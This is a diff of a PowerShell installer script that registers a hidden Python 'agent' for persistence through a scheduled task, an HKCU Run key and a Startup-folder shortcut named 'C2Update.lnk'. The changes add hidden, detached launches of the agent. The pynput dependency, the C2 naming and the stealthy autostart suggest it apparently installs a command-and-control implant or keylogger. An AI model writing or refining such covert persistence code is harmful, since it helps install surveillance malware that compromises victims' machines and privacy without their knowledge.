@@ -213,7 +213,13 @@ pynput>=1.7.0
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -ExecutionTimeLimit (New-TimeSpan -Days 365)
         
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
+        # Give Task Scheduler a moment to persist the task before starting
+        Start-Sleep -Seconds 2
         Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        # Also launch agent directly so it runs immediately (task may not run until next logon on some systems)
+        Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WorkingDirectory $InstallPath -WindowStyle Hidden
+        # Let the process fork and detach before installer exits
+        Start-Sleep -Seconds 3
     } else {
         # Use HKCU Run Key (Reliable for Standard Users)
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -224,9 +230,6 @@ pynput>=1.7.0
         
         try {
             Set-ItemProperty -Path $regPath -Name $name -Value $cmd -ErrorAction Stop
-            
-            # Start immediately
-            Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WindowStyle Hidden
         } catch {
             # Fallback to Startup Folder
             $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2Update.lnk"
@@ -236,9 +239,13 @@ pynput>=1.7.0
             $sh.Arguments = "`"$agentPyPath`""
             $sh.WindowStyle = 7 # Minimized
             $sh.Save()
-            
-            Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WindowStyle Hidden
         }
+        # Brief delay so registry/filesystem are settled before launching
+        Start-Sleep -Seconds 2
+        # Start immediately with correct working directory (matches task behavior)
+        Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WorkingDirectory $InstallPath -WindowStyle Hidden
+        # Let the process fork and detach before installer exits
+        Start-Sleep -Seconds 3
     }
     
 } catch {
